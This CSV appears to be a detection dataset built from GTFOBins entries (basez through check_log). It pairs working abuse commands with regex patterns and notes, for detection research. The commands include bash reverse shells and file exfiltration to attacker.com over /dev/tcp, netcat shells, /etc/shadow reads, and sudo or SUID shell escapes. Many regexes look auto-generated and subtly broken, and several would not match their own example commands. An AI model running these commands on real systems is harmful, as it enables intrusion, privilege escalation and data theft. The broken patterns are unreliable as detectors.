Name,Function,ExampleCode,Regex,Notes
basez,file-read,"basez ""$LFILE"" | basez --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?basez\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
basez,suid,"./basez ""$LFILE"" | basez --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?basez\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
basez,sudo,"sudo basez ""$LFILE"" | basez --decode","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?basez\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bash,shell,bash,(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),
bash,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),Run `nc -l -p 12345` on the attacker box to receive the shell.
bash,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
bash -c 'echo -e ""POST / HTTP/0.9\n\n$(<$LFILE)"" > /dev/tcp/$RHOST/$RPORT'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.
bash,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),"Send local file using a TCP connection. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file."
bash,file-download,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
bash -c '{ echo -ne ""GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n"" 1>&3; cat 0<&3; } \
3<>/dev/tcp/$RHOST/$RPORT \
| { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } > $LFILE'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),Fetch a remote file via HTTP GET request.
bash,file-download,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),"Fetch remote file using a TCP connection. Run `nc -l -p 12345 < ""file_to_send""` on the attacker box to send the file."
bash,file-write,"export LFILE=file_to_write
bash -c 'echo DATA > $LFILE'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),
bash,file-write,"history -c
DATA
history -w $LFILE",(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),This adds timestamps to the output file.
bash,file-read,"export LFILE=file_to_read
bash -c 'echo ""$(<$LFILE)""'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),It trims trailing newlines and it's not binary-safe.
bash,file-read,"history -r $LFILE
history",(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),The read file content is surrounded by the current history content.
bash,library-load,bash -c 'enable -f ./lib.so x',(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),
bash,suid,./bash -p,(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),
bash,sudo,sudo bash,(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),
batcat,shell,"batcat --paging always /etc/profile
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?batcat\s*\-\-paging\s+(?:/bin/(?:sh|bash))),
batcat,limited-suid,"./batcat --paging always /etc/profile
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?batcat\s*\-\-paging\s+(?:/bin/(?:sh|bash))),
batcat,sudo,"sudo batcat --paging always /etc/profile
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?batcat\s*\-\-paging\s+(?:/bin/(?:sh|bash))),
bc,file-read,"bc -s $LFILE
quit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bc\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bc,sudo,"sudo bc -s $LFILE
quit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bc\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bc,suid,"./bc -s $LFILE
quit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bc\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bconsole,shell,"bconsole
@exec /bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bconsole\s+(?:/bin/(?:sh|bash))),
bconsole,sudo,"sudo bconsole
@exec /bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bconsole\s+(?:/bin/(?:sh|bash))),
bconsole,file-read,bconsole -c /etc/shadow,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bconsole\s*\-c\s+.+),"The file is actually parsed and the first wrong line is returned in an error message, thus it may not be suitable for reading arbitrary files."
bpftrace,sudo,"sudo bpftrace -e 'BEGIN {system(""/bin/sh"");exit()}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bpftrace\s*\-e\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bpftrace,sudo,"echo 'BEGIN {system(""/bin/sh"");exit()}' >$TF
sudo bpftrace $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bpftrace\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bpftrace,sudo,sudo bpftrace -c /bin/sh -e 'END {exit()}',"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bpftrace\s*\-c\s*\-e\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bridge,file-read,"bridge -b ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bridge\s*\-b\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bridge,suid,"./bridge -b ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bridge\s*\-b\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bridge,sudo,"sudo bridge -b ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bridge\s*\-b\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundle,shell,"bundle help
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundle\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply."
bundle,shell,"export BUNDLE_GEMFILE=x
bundle exec /bin/sh","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundle\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundle,shell,"touch $TF/Gemfile
cd $TF
bundle exec /bin/sh","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundle\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundle,shell,"touch $TF/Gemfile
cd $TF
bundle console
system('/bin/sh -c /bin/sh')","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundle\s*\-c\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This spawns an interactive shell via [`irb`](/gtfobins/irb/).
bundle,shell,"echo 'system(""/bin/sh"")' > $TF/Gemfile
cd $TF
bundle install","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundle\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundle,sudo,"sudo bundle help
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundle\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply."
bundler,shell,"bundler help
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundler\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply."
bundler,shell,"export BUNDLE_GEMFILE=x
bundler exec /bin/sh","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundler\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundler,shell,"touch $TF/Gemfile
cd $TF
bundler exec /bin/sh","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundler\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundler,shell,"touch $TF/Gemfile
cd $TF
bundler console
system('/bin/sh -c /bin/sh')","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundler\s*\-c\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This spawns an interactive shell via [`irb`](/gtfobins/irb/).
bundler,shell,"echo 'system(""/bin/sh"")' > $TF/Gemfile
cd $TF
bundler install","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundler\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundler,sudo,"sudo bundler help
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundler\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply."
busctl,shell,"busctl --show-machine
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busctl\s*\-\-show\-machine\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
busctl,shell,"busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busctl\s*\-\-address\s*\-i\s+(?:/bin/(?:sh|bash))),
busctl,sudo,"sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busctl\s*\-\-address\s*\-i\s+(?:/bin/(?:sh|bash))),
busctl,suid,"./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busctl\s*\-\-address\s*\-p\s*\-i\s+(?:/bin/(?:sh|bash))),
busybox,shell,busybox sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busybox\s+.+),
busybox,file-upload,busybox httpd -f -p $LPORT -h .,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busybox\s*\-f\s*\-p\s*\-h\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Serve files in the local folder running an HTTP server.
busybox,file-write,"busybox sh -c 'echo ""DATA"" > $LFILE'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busybox\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
busybox,file-read,"./busybox cat ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busybox\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
busybox,suid,./busybox sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busybox\s+.+),It may drop the SUID privileges depending on the compilation flags and the runtime configuration.
busybox,sudo,sudo busybox sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busybox\s+.+),
busybox,reverse-shell,busybox nc -e /bin/sh $RHOST $RPORT,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busybox\s*\-e\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -lvp 12345` on the attacker box to receive the shell.
byebug,shell,"echo 'system(""/bin/sh"")' > $TF
byebug $TF
continue","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?byebug\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
byebug,limited-suid,"echo 'system(""/bin/sh"")' > $TF
./byebug $TF
continue","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?byebug\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
byebug,sudo,"echo 'system(""/bin/sh"")' > $TF
sudo byebug $TF
continue","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?byebug\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bzip2,file-read,bzip2 -c $LFILE | bzip2 -d,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bzip2\s*\-c\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bzip2,suid,./bzip2 -c $LFILE | bzip2 -d,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bzip2\s*\-c\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bzip2,sudo,sudo bzip2 -c $LFILE | bzip2 -d,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bzip2\s*\-c\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
c89,file-read,"c89 -x c -E ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?c89\s*\-x\s*\-E\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
c89,file-write,c89 -xc /dev/null -o $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?c89\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
c89,shell,"c89 -wrapper /bin/sh,-s .",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?c89\s+(?:/bin/(?:sh|bash))),
c89,sudo,"sudo c89 -wrapper /bin/sh,-s .",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?c89\s+(?:/bin/(?:sh|bash))),
c99,file-read,"c99 -x c -E ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?c99\s*\-x\s*\-E\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
c99,file-write,c99 -xc /dev/null -o $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?c99\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
c99,shell,"c99 -wrapper /bin/sh,-s .",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?c99\s+(?:/bin/(?:sh|bash))),
c99,sudo,"sudo c99 -wrapper /bin/sh,-s .",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?c99\s+(?:/bin/(?:sh|bash))),
cabal,shell,cabal exec -- /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cabal\s+(?:/bin/(?:sh|bash))),
cabal,suid,./cabal exec -- /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cabal\s*\-p\s+(?:/bin/(?:sh|bash))),
cabal,sudo,sudo cabal exec -- /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cabal\s+(?:/bin/(?:sh|bash))),
cancel,file-upload,"cancel -u ""$(cat $LFILE)"" -h $RHOST:$RPORT","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cancel\s*\-u\s*\-h\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send local file using a TCP connection. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file."
capsh,shell,capsh --,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?capsh\s+.+),
capsh,suid,./capsh --gid=0 --uid=0 --,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?capsh\s*\-\-gid\s*\-\-uid\s+.+),
capsh,sudo,sudo capsh --,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?capsh\s+.+),
cat,file-read,"cat ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cat\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cat,suid,"./cat ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cat\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cat,sudo,"sudo cat ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cat\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cdist,shell,cdist shell -s /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cdist\s*\-s\s+(?:/bin/(?:sh|bash))),
cdist,sudo,sudo cdist shell -s /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cdist\s*\-s\s+(?:/bin/(?:sh|bash))),
certbot,shell,certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0',"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?certbot\s*\-n\s*\-d\s*\-\-standalone\s*\-\-dry\-run\s*\-\-agree\-tos\s*\-\-email\s*\-\-logs\-dir\s*\-\-work\-dir\s*\-\-config\-dir\s*\-\-pre\-hook\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
certbot,sudo,sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0',"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?certbot\s*\-n\s*\-d\s*\-\-standalone\s*\-\-dry\-run\s*\-\-agree\-tos\s*\-\-email\s*\-\-logs\-dir\s*\-\-work\-dir\s*\-\-config\-dir\s*\-\-pre\-hook\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_by_ssh,shell,"check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?check_by_ssh\s*\-o\s*\-i\s*\-H\s*\-C\s+(?:/bin/(?:sh|bash))),The shell will only last 10 seconds.
check_by_ssh,sudo,"sudo check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?check_by_ssh\s*\-o\s*\-i\s*\-H\s*\-C\s+(?:/bin/(?:sh|bash))),The shell will only last 10 seconds.
check_cups,file-read,check_cups --extra-opts=@$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?check_cups\s*\-\-extra\-opts\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_cups,sudo,sudo check_cups --extra-opts=@$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?check_cups\s*\-\-extra\-opts\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_log,file-read,"check_log -F $LFILE -O $OUTPUT
cat $OUTPUT","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?check_log\s*\-F\s*\-O\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_log,file-write,check_log -F $INPUT -O $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?check_log\s*\-F\s*\-O\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
